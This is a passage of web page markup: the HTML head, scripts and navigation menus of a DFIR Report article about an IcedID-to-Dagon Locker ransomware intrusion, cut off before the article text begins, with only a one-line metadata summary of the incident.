<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>From IcedID to Dagon Locker Ransomware in 29 Days &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="559de86b3a68296c0e054648-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="559de86b3a68296c0e054648-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="559de86b3a68296c0e054648-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/32050" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=32050' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F04%2F29%2Ffrom-icedid-to-dagon-locker-ransomware-in-29-days%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F04%2F29%2Ffrom-icedid-to-dagon-locker-ransomware-in-29-days%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="559de86b3a68296c0e054648-text/javascript"></script>
		<script type="559de86b3a68296c0e054648-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="559de86b3a68296c0e054648-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=74AD3A9F8CB84709D88734881D00454C');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="From IcedID to Dagon Locker Ransomware in 29 Days" />
<meta property="og:url" content="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/" />
<meta property="og:description" content="Key Takeaways In August 2023, we observed an intrusion that started with a phishing campaign using PrometheusTDS to distribute IcedID. IcedID dropped and executed a Cobalt Strike beacon, which was …" />
<meta property="article:published_time" content="2024-04-29T01:21:08+00:00" />
<meta property="article:modified_time" content="2024-04-29T16:47:59+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2024/04/23869-071.png" />
<meta property="og:image:width" content="6000" />
<meta property="og:image:height" content="3375" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="From IcedID to Dagon Locker Ransomware in 29 Days" />
<meta name="twitter:card" content="summary" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-32050 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
